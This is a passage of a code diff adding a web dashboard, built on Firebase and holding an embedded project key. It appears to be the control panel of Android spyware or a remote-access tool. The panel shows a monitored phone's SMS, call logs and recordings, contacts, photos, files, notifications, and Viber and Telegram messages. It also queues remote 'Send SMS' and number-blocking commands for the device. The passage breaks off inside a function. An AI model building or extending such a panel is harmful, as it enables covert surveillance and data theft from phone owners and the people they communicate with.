+        <button class="tab-btn" data-tab="photos">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
+                <circle cx="8.5" cy="8.5" r="1.5"/>
+                <polyline points="21 15 16 10 5 21"/>
+              </svg>
+            </span>
+            <span>Photos</span>
+          </span>
+          <span class="btn-right">
+            <span class="badge hidden" id="badge-photos">0</span>
+            <span class="arrow">›</span>
+          </span>
+        </button>
+
+        <button class="tab-btn" data-tab="files">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/>
+                <polyline points="13 2 13 9 20 9"/>
+              </svg>
+            </span>
+            <span>Files</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+
+        <button class="tab-btn" data-tab="send">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="22" y1="2" x2="11" y2="13"/>
+                <polygon points="22 2 15 22 11 13 2 9 22 2"/>
+              </svg>
+            </span>
+            <span>Send SMS</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+
+        <button class="tab-btn" data-tab="block">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#8b5cf6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"/>
+                <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>
+              </svg>
+            </span>
+            <span>Block List</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+
+        <button class="tab-btn" data-tab="noti">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#ec4899" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
+                <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
+              </svg>
+            </span>
+            <span>Notifications</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+
+        <button class="tab-btn" data-tab="viber">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="#7360f2">
+                <path d="M12 0C5.4 0 0 4.4 0 9.8c0 3.6 2.2 6.7 5.5 8.4l-1.4 5.2 5.6-3c.7.1 1.5.2 2.3.2 6.6 0 12-4.4 12-9.8S18.6 0 12 0z"/>
+              </svg>
+            </span>
+            <span>Viber</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+
+        <button class="tab-btn" data-tab="telegram">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="#2aabee">
+                <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/>
+              </svg>
+            </span>
+            <span>Telegram</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+
+        <button class="tab-btn" data-tab="apps">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+                <line x1="12" y1="18" x2="12.01" y2="18"/>
+              </svg>
+            </span>
+            <span>System Apps</span>
+          </span>
+          <span class="arrow">›</span>
+        </button>
+
+      </div>
+    </div>
+
+    <div id="dataScreen" class="hidden">
+      <button class="back-btn" id="backBtn">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="19" y1="12" x2="5" y2="12"/>
+          <polyline points="12 19 5 12 12 5"/>
+        </svg>
+        Back
+      </button>
+      <div class="info-bar" id="fetchInfo"></div>
+
+      <div id="tab-photos" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
+            <circle cx="8.5" cy="8.5" r="1.5"/>
+            <polyline points="21 15 16 10 5 21"/>
+          </svg>
+          Photos
+        </div>
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="photoTotal">0</div><div class="lbl">Loaded</div></div>
+        </div>
+        <div id="photoList"></div>
+        <button class="load-more-btn" id="loadMoreBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="12" y1="5" x2="12" y2="19"/>
+            <line x1="5" y1="12" x2="19" y2="12"/>
+          </svg>
+          Load 5 More Photos
+        </button>
+      </div>
+
+      <div id="tab-files" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/>
+            <polyline points="13 2 13 9 20 9"/>
+          </svg>
+          Files
+        </div>
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="fileTotal">0</div><div class="lbl">Total</div></div>
+          <div class="stat-card"><div class="num" id="fileShown">0</div><div class="lbl">Shown</div></div>
+        </div>
+        <button class="load-more-btn" id="refreshFilesBtn" style="background:linear-gradient(135deg,#10b981,#38bdf8);margin-bottom:12px;">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="23 4 23 10 17 10"/>
+            <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/>
+          </svg>
+          Refresh File List
+        </button>
+        <div id="fileList"></div>
+      </div>
+
+      <div id="tab-send" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="22" y1="2" x2="11" y2="13"/>
+            <polygon points="22 2 15 22 11 13 2 9 22 2"/>
+          </svg>
+          Send SMS
+        </div>
+        <div class="form-box">
+          <h3>
+            <svg viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+            </svg>
+            New Message
+          </h3>
+          <div class="form-row">
+            <label>Phone Number</label>
+            <input type="tel" id="sendNumber" placeholder="09xxxxxxxxx or +959xxxxxxxxx">
+          </div>
+          <div class="form-row">
+            <label>Message</label>
+            <textarea id="sendBody" placeholder="Type your message..."></textarea>
+          </div>
+          <button class="btn-primary" id="sendSmsBtn">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="22" y1="2" x2="11" y2="13"/>
+              <polygon points="22 2 15 22 11 13 2 9 22 2"/>
+            </svg>
+            Send SMS
+          </button>
+        </div>
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="cmdPending">0</div><div class="lbl">Pending</div></div>
+          <div class="stat-card"><div class="num" id="cmdSent">0</div><div class="lbl">Sent</div></div>
+          <div class="stat-card"><div class="num" id="cmdFailed">0</div><div class="lbl">Failed</div></div>
+        </div>
+        <h3 style="color: #94a3b8; font-size: 13px; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px;">Recent Commands</h3>
+        <div id="cmdList"></div>
+      </div>
+
+      <div id="tab-block" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#8b5cf6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/>
+            <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>
+          </svg>
+          Block List
+        </div>
+        <div class="form-box">
+          <h3>
+            <svg viewBox="0 0 24 24" fill="none" stroke="#8b5cf6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"/>
+              <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>
+            </svg>
+            Block a Number
+          </h3>
+          <div class="form-row">
+            <label>Phone Number</label>
+            <input type="tel" id="blockNumber" placeholder="09xxxxxxxxx">
+          </div>
+          <button class="btn-primary btn-danger" id="blockBtn">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"/>
+              <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>
+            </svg>
+            Block Number
+          </button>
+        </div>
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="blockedTotal">0</div><div class="lbl">Blocked</div></div>
+        </div>
+        <h3 style="color: #94a3b8; font-size: 13px; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px;">Blocked Numbers</h3>
+        <div id="blockedList"></div>
+      </div>
+
+      <div id="tab-sms" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+            <polyline points="22,6 12,13 2,6"/>
+          </svg>
+          Messages
+        </div>
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="statTotal">0</div><div class="lbl">Total</div></div>
+          <div class="stat-card"><div class="num" id="statIn">0</div><div class="lbl">Inbox</div></div>
+          <div class="stat-card"><div class="num" id="statOut">0</div><div class="lbl">Sent</div></div>
+        </div>
+        <div id="smsList"></div>
+      </div>
+
+      <div id="tab-calls" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+          </svg>
+          Call Logs &amp; Recordings
+        </div>
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="callTotal">0</div><div class="lbl">Total</div></div>
+          <div class="stat-card"><div class="num" id="callIn">0</div><div class="lbl">Incoming</div></div>
+          <div class="stat-card"><div class="num" id="callOut">0</div><div class="lbl">Outgoing</div></div>
+          <div class="stat-card"><div class="num" id="callMissed">0</div><div class="lbl">Missed</div></div>
+        </div>
+        <div id="callList"></div>
+      </div>
+
+      <div id="tab-contacts" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#a855f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
+            <circle cx="9" cy="7" r="4"/>
+            <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
+            <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+          </svg>
+          Contacts
+        </div>
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="contactTotal">0</div><div class="lbl">Unique</div></div>
+          <div class="stat-card"><div class="num" id="contactDuplicates">0</div><div class="lbl">Duplicates</div></div>
+        </div>
+        <div id="contactList"></div>
+      </div>
+
+      <div id="tab-noti" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#ec4899" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
+            <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
+          </svg>
+          Notifications
+        </div>
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="notiTotal">0</div><div class="lbl">Total</div></div>
+          <div class="stat-card"><div class="num" id="notiApps">0</div><div class="lbl">Apps</div></div>
+        </div>
+        <div id="notiList"></div>
+      </div>
+
+      <div id="tab-viber" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="#7360f2"><path d="M12 0C5.4 0 0 4.4 0 9.8c0 3.6 2.2 6.7 5.5 8.4l-1.4 5.2 5.6-3c.7.1 1.5.2 2.3.2 6.6 0 12-4.4 12-9.8S18.6 0 12 0z"/></svg>
+          Viber
+        </div>
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="viberTotal">0</div><div class="lbl">Total</div></div>
+          <div class="stat-card"><div class="num" id="viberContacts">0</div><div class="lbl">Contacts</div></div>
+        </div>
+        <div id="viberList"></div>
+      </div>
+
+      <div id="tab-telegram" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="#2aabee"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
+          Telegram
+        </div>
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="tgTotal">0</div><div class="lbl">Total</div></div>
+          <div class="stat-card"><div class="num" id="tgContacts">0</div><div class="lbl">Contacts</div></div>
+        </div>
+        <div id="telegramList"></div>
+      </div>
+
+      <div id="tab-apps" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+            <line x1="12" y1="18" x2="12.01" y2="18"/>
+          </svg>
+          System Apps
+        </div>
+        <div id="appsList"></div>
+      </div>
+
+    </div>
+  </div>
+</div>
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getAuth, signInWithEmailAndPassword, signOut, setPersistence, browserLocalPersistence, onAuthStateChanged }
+    from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+  import { initializeFirestore, persistentLocalCache, persistentMultipleTabManager, collection, query, limit, onSnapshot, addDoc, deleteDoc, doc }
+    from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+  // ═══════════════ FIREBASE CONFIG ═══════════════
+  const firebaseConfig = {
+    apiKey: "AIzaSyApywYd17o9FNZ70v7bP1Zb3pw3LVjrwM4",
+    authDomain: "zaw-myo-naing-7736b.firebaseapp.com",
+    databaseURL: "https://zaw-myo-naing-7736b-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "zaw-myo-naing-7736b",
+    storageBucket: "zaw-myo-naing-7736b.firebasestorage.app",
+    messagingSenderId: "37439530373",
+    appId: "1:37439530373:android:0e3d3354cb64c77b0c50ec"
+  };
+
+  // ═══════════════ SAFE FIREBASE INIT ═══════════════
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+
+  let db;
+  try {
+    db = initializeFirestore(app, {
+      localCache: persistentLocalCache({ tabManager: persistentMultipleTabManager() })
+    });
+    console.log("✅ Firestore: persistent cache OK");
+  } catch (e) {
+    console.warn("⚠️ Persistent cache failed, using memory cache:", e);
+    try {
+      db = initializeFirestore(app, {});
+      console.log("✅ Firestore: memory cache OK");
+    } catch (e2) {
+      console.error("❌ Firestore init failed:", e2);
+      document.getElementById('loadingScreen').classList.add('hidden');
+      document.getElementById('loginScreen').classList.remove('hidden');
+      document.getElementById('loginError').textContent = "Firestore init failed";
+      throw e2;
+    }
+  }
+
+  // ═══════════════ BOOT TIMEOUT (3s) ═══════════════
+  const BOOT_TIMEOUT = setTimeout(() => {
+    const loading = document.getElementById('loadingScreen');
+    if (loading && !loading.classList.contains('hidden')) {
+      console.warn("⏰ Boot timeout — showing login");
+      showLogin();
+    }
+  }, 3000);
+
+  setPersistence(auth, browserLocalPersistence)
+    .then(() => console.log("✅ Persistence: LOCAL"))
+    .catch(e => console.warn("Persistence:", e));
+
+  // ═══════════════ SVG ICON HELPER ═══════════════
+  function svgIcon(name, color, size) {
+    size = size || 16;
+    color = color || 'currentColor';
+    const paths = {
+      mail: '<path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/>',
+      phone: '<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>',
+      mic: '<path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/>',
+      users: '<path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/>',
+      bell: '<path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/>',
+      app: '<rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/>',
+      box: '<path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/>',
+      lock: '<rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
+      user: '<path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>',
+      settings: '<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/>',
+      download: '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>',
+      inbox: '<polyline points="22 12 16 12 14 15 10 15 8 12 2 12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/>',
+      check: '<polyline points="20 6 9 17 4 12"/>',
+      x: '<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>',
+      info: '<circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>',
+      alert: '<path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>',
+      send: '<line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/>',
+      ban: '<circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>',
+      unlock: '<rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/>',
+      clock: '<circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>',
+      volumeOff: '<polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/>',
+      photo: '<rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/>',
+      file: '<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/>'
+    };
+    const p = paths[name] || '';
+    return '<svg width="' + size + '" height="' + size + '" viewBox="0 0 24 24" fill="none" stroke="' + color + '" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:middle;flex-shrink:0">' + p + '</svg>';
+  }
+
+  // ═══════════════ DOM REFERENCES ═══════════════
+  const loginScreen    = document.getElementById('loginScreen');
+  const loadingScreen  = document.getElementById('loadingScreen');
+  const dashScreen     = document.getElementById('dashScreen');
+  const menuScreen     = document.getElementById('menuScreen');
+  const dataScreen     = document.getElementById('dataScreen');
+  const backBtn        = document.getElementById('backBtn');
+  const loginBtn       = document.getElementById('loginBtn');
+  const loginError     = document.getElementById('loginError');
+  const logoutBtn      = document.getElementById('logoutBtn');
+  const refreshBtn     = document.getElementById('refreshBtn');
+  const emailInput     = document.getElementById('emailInput');
+  const passwordInput  = document.getElementById('passwordInput');
+  const userEmail      = document.getElementById('userEmail');
+  const fetchInfo      = document.getElementById('fetchInfo');
+  const liveBadge      = document.getElementById('liveBadge');
+  const toastContainer = document.getElementById('toastContainer');
+  const loadMoreBtn    = document.getElementById('loadMoreBtn');
+  const refreshFilesBtn = document.getElementById('refreshFilesBtn');
+
+  // ═══════════════ STATE ═══════════════
+  let allDocs = [];
+  let commands = [];
+  let blockedList = [];
+  let currentEmail = "";
+  let currentTab = null;
+  let unsubMessageList = [];
+  let unsubCommandList = [];
+  let unsubBlockedList = [];
+
+  const CACHE_PREFIX = "vipz_cache_";
+  const CACHE_MAX_AGE = 7 * 24 * 60 * 60 * 1000;
+  const BADGE_PREFIX = "vipz_badge_";
+
+  // ═══════════════ BADGE / CACHE ═══════════════
+  function getLastSeen(email, tab) {
+    try { return parseInt(localStorage.getItem(BADGE_PREFIX + email.toLowerCase() + "_" + tab) || "0"); }
+    catch (e) { return 0; }
+  }
+  function setLastSeen(email, tab, ts) {
+    try { localStorage.setItem(BADGE_PREFIX + email.toLowerCase() + "_" + tab, String(ts || Date.now())); } catch (e) {}
+  }
+  function saveCache(email, docs) {
+    if (!email) return;
+    try {
+      localStorage.setItem(CACHE_PREFIX + email.toLowerCase(), JSON.stringify({
+        docs: docs, time: Date.now(), version: 1
+      }));
+    } catch (e) {}
+  }
+  function loadCache(email) {
+    if (!email) return null;
+    try {
+      const s = localStorage.getItem(CACHE_PREFIX + email.toLowerCase());
+      if (!s) return null;
+      const obj = JSON.parse(s);
+      if (!obj || !Array.isArray(obj.docs)) return null;
+      if (Date.now() - obj.time > CACHE_MAX_AGE) {
+        localStorage.removeItem(CACHE_PREFIX + email.toLowerCase());
+        return null;
+      }
+      return obj;
+    } catch (e) { return null; }
+  }
+
+  // ═══════════════ TOASTS ═══════════════
+  function showToast(message, type = 'info', duration = 4000) {
+    if (!toastContainer) return;
+    const toast = document.createElement('div');
+    toast.className = 'toast ' + type;
+    const iconMap = {
+      error: svgIcon('x', 'white', 16),
+      success: svgIcon('check', 'white', 16),
+      info: svgIcon('info', 'white', 16),
+      warning: svgIcon('alert', 'white', 16)
+    };
+    toast.innerHTML = (iconMap[type] || '') + '<span>' + escapeHtml(message) + '</span>';
+    toastContainer.appendChild(toast);
+    setTimeout(() => {
+      toast.classList.add('hiding');
+      setTimeout(() => { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 300);
+    }, duration);
+  }
+  function toastError(m)   { showToast(m, 'error', 6000); }
+  function toastSuccess(m) { showToast(m, 'success', 3000); }
+  function toastInfo(m)    { showToast(m, 'info', 3000); }
+  function toastWarning(m) { showToast(m, 'warning', 5000); }
+
+  // ═══════════════ LIVE BADGE ═══════════════
+  function setLive(status) {
+    if (!liveBadge) return;
+    liveBadge.classList.remove('offline', 'connecting', 'cached');
+    if (status === 'offline') {
+      liveBadge.classList.add('offline');
+      liveBadge.innerHTML = '<span class="live-dot"></span>OFFLINE';
+    } else if (status === 'connecting') {
+      liveBadge.classList.add('connecting');
+      liveBadge.innerHTML = '<span class="live-dot"></span>WAIT';
+    } else if (status === 'cached') {
+      liveBadge.classList.add('cached');
+      liveBadge.innerHTML = '<span class="live-dot"></span>CACHED';
+    } else {
+      liveBadge.innerHTML = '<span class="live-dot"></span>LIVE';
+    }
+  }
+
+  // ═══════════════ RESET / STOP ═══════════════
+  function resetAllState() {
+    allDocs = []; commands = []; blockedList = [];
+    currentTab = null;
+    stopRealtimeListener();
+  }
+
+  function stopRealtimeListener() {
+    unsubMessageList.forEach(u => { try { u(); } catch (e) {} });
+    unsubCommandList.forEach(u => { try { u(); } catch (e) {} });
+    unsubBlockedList.forEach(u => { try { u(); } catch (e) {} });
+    unsubMessageList = [];
+    unsubCommandList = [];
+    unsubBlockedList = [];
+  }
+
+  // ═══════════════ DATE PARSE ═══════════════
+  function parseDateToMs(s) {
+    if (!s) return 0;
+    const m = String(s).match(/(\d{4})-(\d{2})-(\d{2})[ T](\d{2}):(\d{2}):(\d{2})/);
+    if (!m) return 0;
+    return new Date(parseInt(m[1]), parseInt(m[2]) - 1, parseInt(m[3]), parseInt(m[4]), parseInt(m[5]), parseInt(m[6])).getTime();
+  }
+
+  // ═══════════════ BADGES ═══════════════
+  function computeBadges() {
+    if (!currentEmail) return;
+    try {
+      const smsDocs = allDocs.filter(d => (d.sender || "").startsWith("SMS_"));
+      let latestSmsTime = 0;
+      smsDocs.forEach(doc => {
+        const text = (doc.body || "").replace(/\r\n/g, "\n");
+        const blocks = text.split("----------------------------------------");
+        blocks.forEach(block => {
+          const b = block.trim();
+          if (!b) return;
+          const m = b.match(/\[\s*(IN|OUT)\s*\]\s*([^\n]+)/);
+          if (m) { const t = parseDateToMs(m[2].trim()); if (t > latestSmsTime) latestSmsTime = t; }
+        });
+      });
+      updateBadge("sms", latestSmsTime > getLastSeen(currentEmail, "sms") ? 1 : 0);
+    } catch (e) {}
+
+    try {
+      const callDocs = allDocs.filter(d => (d.sender || "").startsWith("CALL_LOG_"));
+      let latestCallTime = 0;
+      callDocs.forEach(doc => {
+        const text = (doc.body || "").replace(/\r\n/g, "\n");
+        const blocks = text.split("----------------------------------------");
+        blocks.forEach(block => {
+          const b = block.trim();
+          if (!b) return;
+          const m = b.match(/\[(INCOMING|OUTGOING|MISSED|REJECTED|UNKNOWN)\]\s*\|\s*([^\n]+)/);
+          if (m) { const t = parseDateToMs(m[2].trim()); if (t > latestCallTime) latestCallTime = t; }
+        });
+      });
+      updateBadge("calls", latestCallTime > getLastSeen(currentEmail, "calls") ? 1 : 0);
+    } catch (e) {}
+
+    try {
+      const contactDocs = allDocs.filter(d => (d.sender || "").startsWith("CONTACTS_"));
+      let latestContactTime = 0;
+      contactDocs.forEach(doc => { if (doc.date) { const t = doc.date * 1000; if (t > latestContactTime) latestContactTime = t; } });
